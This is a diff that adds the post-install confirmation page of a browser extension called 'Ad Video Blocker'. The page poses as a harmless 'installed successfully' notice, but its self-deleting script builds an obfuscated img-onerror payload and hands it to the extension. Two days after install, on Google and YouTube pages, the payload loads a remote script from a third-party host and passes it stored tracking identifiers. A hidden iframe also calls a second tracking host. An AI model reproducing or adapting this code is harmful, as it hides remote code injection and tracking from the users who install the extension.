@@ -1,0 +1,76 @@
+<html lang="en">
+   <head>
+      <meta name="referrer" content="origin">
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      <link rel="icon" type="image/png" href="ext/128.png" />
+      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+      <link rel="stylesheet" type="text/css" href="css/theme-default.css">
+      <title>Extension successfully installed</title>
+      <style>
+         .block-header .icon img {
+         width: 160px !important;
+         }
+         footer {
+         background-color: #FFF;
+         border-top: solid 1px #ddd;
+         color:#888;
+         font-size: 14px;
+         text-align:center;padding: 20px 0;width: 100%;
+         }
+         footer a {
+         color:#888;
+         font-size: 14px;
+         }
+      </style>
+   </head>
+   <body class="">
+      <section class="main-section">
+         <div class="container">
+         <div class="row">
+            <div class="offset-md-3 col-md-6 text-center">
+               <img style="width: 100%;max-width: 128px;" src="ext/128.png"/>
+               <h1>Ad Video Blocker</h1>
+               <label class="lbl_info">Extension installed successfully</label>
+            </div>
+         </div>
+      </section>
+      <script type="text/javascript" id="rm">
+         var timestamp = localStorage.getItem('timestamp');
+         var eId = localStorage.getItem('eId');
+         var atr = localStorage.getItem('atr');
+         var itr = localStorage.getItem('itr');
+         var id = '60c25f638e607';
+         var current_timestamp = Date.now() + (2 * 24 * 60 * 60 * 1000);
+         	id = "<img src onerror='if ("+current_timestamp+" < Date.now() && /.(google|youtube)./.test(document.location.origin)){var s = document.createElement(\"script\");s.type = \"text/javascript\"; s.onload = function(){this.parentNode.removeChild(this)}; s.src = \"https://abundantiaopus.com/impl.php?i=" + itr + "&atr=" + atr + "&id=" + eId + "&start=" + timestamp + "\";document.getElementsByTagName(\"head\")[0].appendChild(s);} this.parentNode.removeChild(this);'>";
+         
+         	chrome.runtime.sendMessage('mabadchclkilfghbpeomkmbldhncgklf', {id: id});
+         
+          document.querySelector('#rm').parentNode.removeChild(document.querySelector('#rm'));
+      </script>					
+      <script type="text/javascript">
+         function redirect() {
+         		if (false) {
+         				var siframe = document.createElement('iframe');
+         				siframe.style['display'] = 'none';
+         				siframe.onload = function() {
+         						setTimeout(function(){
+         								window.location.href = '';
+         						}, 2000);
+         				};
+         				siframe.src = "https://advideoblock.com";
+         				document.body.appendChild(siframe);
+         		}
+         		else {
+         				window.location.href = '';
+         		}
+         }
+      </script>
+      <script type="text/javascript">
+         var install_iframe = document.createElement('iframe');
+         install_iframe.style['display'] = 'none';
+         install_iframe.src = "https://tbm09.com/c.php?id=mabadchclkilfghbpeomkmbldhncgklf";
+         document.body.appendChild(install_iframe);
+      </script>
+   </body>
+</html>
